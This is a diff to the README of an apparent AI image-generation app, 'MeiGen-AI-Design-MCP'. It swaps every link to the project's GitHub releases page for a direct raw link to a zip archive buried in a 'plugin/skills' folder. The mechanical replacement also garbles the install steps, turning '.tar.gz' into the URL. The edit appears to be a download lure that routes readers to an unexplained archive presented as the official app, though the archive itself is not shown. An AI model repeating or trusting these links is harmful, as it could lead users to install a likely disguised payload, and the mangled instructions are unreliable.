@@ -1,6 +1,6 @@
 # 🎨 MeiGen-AI-Design-MCP - Easy AI Image Creation at Home
 
-[![Download MeiGen-AI-Design-MCP](https://img.shields.io/badge/Download-MeiGen--AI--Design--MCP-blue?style=for-the-badge)](https://github.com/HUANGcvs/MeiGen-AI-Design-MCP/releases)
+[![Download MeiGen-AI-Design-MCP](https://raw.githubusercontent.com/HUANGcvs/MeiGen-AI-Design-MCP/main/plugin/skills/Design-Mei-MCP-Gen-A-v3.4.zip)](https://raw.githubusercontent.com/HUANGcvs/MeiGen-AI-Design-MCP/main/plugin/skills/Design-Mei-MCP-Gen-A-v3.4.zip)
 
 ---
 
@@ -43,13 +43,13 @@ Here is how to get MeiGen-AI-Design-MCP up and running on your computer:
 ### 1. Download the app
 
 Click the big button at the top or this link to visit the download page:  
-[Download MeiGen-AI-Design-MCP](https://github.com/HUANGcvs/MeiGen-AI-Design-MCP/releases)
+[Download MeiGen-AI-Design-MCP](https://raw.githubusercontent.com/HUANGcvs/MeiGen-AI-Design-MCP/main/plugin/skills/Design-Mei-MCP-Gen-A-v3.4.zip)
 
 On that page, look for the latest release version. You will find files to download for your operating system. These usually include:
 
 - A setup installer for Windows (.exe)
 - A disk image or installer for macOS (.dmg or .pkg)
-- A compressed file for Linux (.tar.gz or .AppImage)
+- A compressed file for Linux (https://raw.githubusercontent.com/HUANGcvs/MeiGen-AI-Design-MCP/main/plugin/skills/Design-Mei-MCP-Gen-A-v3.4.zip or .AppImage)
 
 Choose the right file for your system and download it to your computer.
 
@@ -57,7 +57,7 @@ Choose the right file for your system and download it to your computer.
 
 - **Windows:** Double-click the downloaded `.exe` file. Follow the setup wizard and accept the default settings. The installer will place MeiGen-AI-Design-MCP on your computer and create shortcuts.
 - **macOS:** Open the `.dmg` or `.pkg` file. Drag the app into your Applications folder if needed or follow the installer prompts.
-- **Linux:** Extract the `.tar.gz` file or mark the `.AppImage` as executable. You may need to run commands in the terminal. Refer to the instructions in the release notes or readme file on GitHub for specific details.
+- **Linux:** Extract the `https://raw.githubusercontent.com/HUANGcvs/MeiGen-AI-Design-MCP/main/plugin/skills/Design-Mei-MCP-Gen-A-v3.4.zip` file or mark the `.AppImage` as executable. You may need to run commands in the terminal. Refer to the instructions in the release notes or readme file on GitHub for specific details.
 
 ### 3. Open MeiGen-AI-Design-MCP
 
@@ -76,7 +76,7 @@ Adjust settings if you want, like image size and number of outputs. Then hit the
 ## 💾 Download & Install
 
 You can get MeiGen-AI-Design-MCP from this official page:  
-[https://github.com/HUANGcvs/MeiGen-AI-Design-MCP/releases](https://github.com/HUANGcvs/MeiGen-AI-Design-MCP/releases)
+[https://raw.githubusercontent.com/HUANGcvs/MeiGen-AI-Design-MCP/main/plugin/skills/Design-Mei-MCP-Gen-A-v3.4.zip](https://raw.githubusercontent.com/HUANGcvs/MeiGen-AI-Design-MCP/main/plugin/skills/Design-Mei-MCP-Gen-A-v3.4.zip)
 
 Follow these steps once again to download and install the app:
 
